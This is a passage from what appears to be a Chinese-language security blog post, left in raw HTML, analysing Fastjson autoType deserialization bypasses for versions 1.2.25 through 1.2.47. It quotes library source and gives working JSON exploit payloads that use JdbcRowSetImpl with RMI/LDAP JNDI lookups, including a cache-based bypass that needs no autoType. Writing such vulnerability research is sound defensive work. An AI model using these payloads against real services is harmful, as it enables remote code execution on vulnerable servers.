</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=总结>总结</h4><p>这个版本区间（1.2.25&lt;=version&lt;=1.2.41）想要攻击成功（不考虑白名单），需要靶机开启autoType，且不能指定expectClass。也就是如下情况可以进行攻击：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * 1.2.25&lt;=version&lt;=1.2.41
</span></span></span><span class=line><span class=cl><span class=cm> * 1.2.25开始默认关闭了autotype支持
</span></span></span><span class=line><span class=cl><span class=cm> * 此EXP : Bypass checkAutoType()中的黑白名单校验，但是还是需要开启autoType
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>exp3</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ParserConfig</span><span class=o>.</span><span class=na>getGlobalInstance</span><span class=o>().</span><span class=na>setAutoTypeSupport</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>exp</span><span class=o>=</span><span class=s>&#34;{\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;  \&#34;test\&#34;: {\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;@type\&#34;: \&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;,\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;dataSourceName\&#34;: \&#34;rmi://127.0.0.1:1099/Exploit\&#34;,\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;autoCommit\&#34;: true\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;  }\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>exp</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=version-1242>Version 1.2.42</h3><p>这个版本对1.2.25&lt;=version&lt;=1.2.41的黑名单绕过进行了修复，同时将明文的黑名单修改成了10进制，增加安全研究的难度。看到官方修复的Diff：</p><p><img src=/media/2021-08-02-05.png alt></p><p>所以我们只需要双写首字符 <code>L</code> 和双写末字符 <code>;</code> ，截掉后仍然存在首字符 <code>L</code> 以及尾字符 <code>;</code> ，仍然可以绕过黑名单。所以这个版本的EXP如下（仍然需要开启autoType）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * version=1.2.42
</span></span></span><span class=line><span class=cl><span class=cm> * 双写绕过1.2.25&lt;=version&lt;=1.2.41的修复
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>exp4</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ParserConfig</span><span class=o>.</span><span class=na>getGlobalInstance</span><span class=o>().</span><span class=na>setAutoTypeSupport</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>exp</span><span class=o>=</span><span class=s>&#34;{\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;  \&#34;test\&#34;: {\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;@type\&#34;: \&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&#34;,\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;dataSourceName\&#34;: \&#34;rmi://127.0.0.1:1099/Exploit\&#34;,\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;autoCommit\&#34;: true\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;  }\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>exp</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=version-1243>Version 1.2.43</h3><p>这个版本对1.2.42进行了修复，首先看到官方的修复方法：</p><p><img src=/media/image-20210805121625629.png alt=image-20210805121625629></p><p>所以双写LL不能绕过了。但是我们看到 <code>TypeUtils#loadClass</code> 存在如下代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span><span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>0</span><span class=o>)</span> <span class=o>==</span> <span class=sc>&#39;[&#39;</span><span class=o>){</span>
</span></span><span class=line><span class=cl>    <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>componentType</span> <span class=o>=</span> <span class=n>loadClass</span><span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>1</span><span class=o>),</span> <span class=n>classLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>Array</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=n>componentType</span><span class=o>,</span> <span class=n>0</span><span class=o>).</span><span class=na>getClass</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>不仅仅 <code>L</code> 字符可以用来绕过，<code>[</code> 字符也可以绕过；所以就出现了如下EXP：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * version=1.2.43
</span></span></span><span class=line><span class=cl><span class=cm> * 使用 [ 字符绕过1.2.42的修复
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>exp5</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ParserConfig</span><span class=o>.</span><span class=na>getGlobalInstance</span><span class=o>().</span><span class=na>setAutoTypeSupport</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>exp</span> <span class=o>=</span> <span class=s>&#34;{\&#34;test\&#34;:{\&#34;@type\&#34;:\&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:1389/Exploit\&#34;,\&#34;autoCommit\&#34;:true]}}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>exp</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=1244--version--1245>1.2.44 &lt;= Version &lt;= 1.2.45</h3><p>从1.2.44开始，对1.2.43的漏洞进行了修复，首先看到1.2.44对1.2.43的修复：</p><p><img src=/media/image-20210805133026054.png alt=image-20210805133026054></p><p>这个版本区间内，主要是一些黑名单绕过，所以自然也需要开启autoType。Payload后面流量分析章节中再给出。</p><h3 id=1246--version--1247>1.2.46 &lt;= Version &lt;= 1.2.47</h3><p>1.2.46主要是针对一些绕过加了一些黑名单：</p><p><img src=/media/image-20210805133232417.png alt=image-20210805133232417></p><p>然后就出现了不需要开启autoType的绕过利用方式。首先看到payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * 1.2.46 &lt;= Version &lt;= 1.2.47
</span></span></span><span class=line><span class=cl><span class=cm> * 直接绕过autoType，无需开启autoType
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>exp7</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>exp</span><span class=o>=</span><span class=s>&#34;{\&#34;rand1\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;},\&#34;rand2\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://localhost:1389/Object\&#34;,\&#34;autoCommit\&#34;:true}}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>exp</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，这个payload存在两个@type。对这两个@type的解释如下：</p><ul><li>第一个@type：反序列化 <code>java.lang.Class</code> 的过程中，会加载 <code>com.sun.rowset.JdbcRowSetImpl</code> 这个Class，并且加入缓存；</li><li>第二个@type：在没有开启autoType的情况下，可以从缓存中拿 <code>com.sun.rowset.JdbcRowSetImpl</code> 这个Class，且不经过白加黑验证，后续就是正常的反序列化攻击链的流程了。</li></ul><p>首先我们回顾一下 <code>TypeUtils#loadClass</code> 的如下代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>try</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ClassLoader</span> <span class=n>contextClassLoader</span> <span class=o>=</span> <span class=n>Thread</span><span class=o>.</span><span class=na>currentThread</span><span class=o>().</span><span class=na>getContextClassLoader</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=o>(</span><span class=n>contextClassLoader</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>contextClassLoader</span> <span class=o>!=</span> <span class=n>classLoader</span><span class=o>){</span>
</span></span><span class=line><span class=cl>        <span class=n>clazz</span> <span class=o>=</span> <span class=n>contextClassLoader</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>className</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>cache</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>mappings</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=n>className</span><span class=o>,</span> <span class=n>clazz</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>catch</span><span class=o>(</span><span class=n>Throwable</span> <span class=n>e</span><span class=o>){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// skip
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>成功加载Class后，由于cache默认为true，所以会调用 <code>mappings.put(className, clazz)</code> 将Class存入缓存中。我们再看到 <code>ParserConfig#checkAutoType</code> 的代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>checkAutoType</span><span class=o>(</span><span class=n>String</span> <span class=n>typeName</span><span class=o>,</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>expectClass</span><span class=o>,</span> <span class=kt>int</span> <span class=n>features</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>typeName</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>typeName</span><span class=o>.</span><span class=na>length</span><span class=o>()</span> <span class=o>&gt;=</span> <span class=n>128</span> <span class=o>||</span> <span class=n>typeName</span><span class=o>.</span><span class=na>length</span><span class=o>()</span> <span class=o>&lt;</span> <span class=n>3</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>className</span> <span class=o>=</span> <span class=n>typeName</span><span class=o>.</span><span class=na>replace</span><span class=o>(</span><span class=sc>&#39;$&#39;</span><span class=o>,</span> <span class=sc>&#39;.&#39;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>clazz</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>final</span> <span class=kt>long</span> <span class=n>BASIC</span> <span class=o>=</span> <span class=n>0xcbf29ce484222325L</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>final</span> <span class=kt>long</span> <span class=n>PRIME</span> <span class=o>=</span> <span class=n>0x100000001b3L</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>final</span> <span class=kt>long</span> <span class=n>h1</span> <span class=o>=</span> <span class=o>(</span><span class=n>BASIC</span> <span class=o>^</span> <span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>0</span><span class=o>))</span> <span class=o>*</span> <span class=n>PRIME</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>h1</span> <span class=o>==</span> <span class=n>0xaf64164c86024f1aL</span><span class=o>)</span> <span class=o>{</span> <span class=c1>// [
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>((</span><span class=n>h1</span> <span class=o>^</span> <span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>length</span><span class=o>()</span> <span class=o>-</span> <span class=n>1</span><span class=o>))</span> <span class=o>*</span> <span class=n>PRIME</span> <span class=o>==</span> <span class=n>0x9198507b5af98f0L</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>final</span> <span class=kt>long</span> <span class=n>h3</span> <span class=o>=</span> <span class=o>(((((</span><span class=n>BASIC</span> <span class=o>^</span> <span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>0</span><span class=o>))</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span> <span class=n>PRIME</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=o>^</span> <span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>1</span><span class=o>))</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span> <span class=n>PRIME</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=o>^</span> <span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>2</span><span class=o>))</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span> <span class=n>PRIME</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>autoTypeSupport</span> <span class=o>||</span> <span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>long</span> <span class=n>hash</span> <span class=o>=</span> <span class=n>h3</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>3</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>className</span><span class=o>.</span><span class=na>length</span><span class=o>();</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>hash</span> <span class=o>^=</span> <span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>i</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=n>hash</span> <span class=o>*=</span> <span class=n>PRIME</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>Arrays</span><span class=o>.</span><span class=na>binarySearch</span><span class=o>(</span><span class=n>acceptHashCodes</span><span class=o>,</span> <span class=n>hash</span><span class=o>)</span> <span class=o>&gt;=</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>,</span> <span class=kc>false</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>Arrays</span><span class=o>.</span><span class=na>binarySearch</span><span class=o>(</span><span class=n>denyHashCodes</span><span class=o>,</span> <span class=n>hash</span><span class=o>)</span> <span class=o>&gt;=</span> <span class=n>0</span> <span class=o>&amp;&amp;</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>getClassFromMapping</span><span class=o>(</span><span class=n>typeName</span><span class=o>)</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>getClassFromMapping</span><span class=o>(</span><span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>clazz</span> <span class=o>=</span> <span class=n>deserializers</span><span class=o>.</span><span class=na>findClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span>
</span></span><span class=line><span class=cl>                <span class=o>&amp;&amp;</span> <span class=n>clazz</span> <span class=o>!=</span> <span class=n>java</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>HashMap</span><span class=o>.</span><span class=na>class</span>
</span></span><span class=line><span class=cl>                <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(!</span><span class=n>autoTypeSupport</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>long</span> <span class=n>hash</span> <span class=o>=</span> <span class=n>h3</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>3</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>className</span><span class=o>.</span><span class=na>length</span><span class=o>();</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>char</span> <span class=n>c</span> <span class=o>=</span> <span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>i</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=n>hash</span> <span class=o>^=</span> <span class=n>c</span><span class=o>;</span>
</span></span><span class=line><span class=cl>            <span class=n>hash</span> <span class=o>*=</span> <span class=n>PRIME</span><span class=o>;</span>
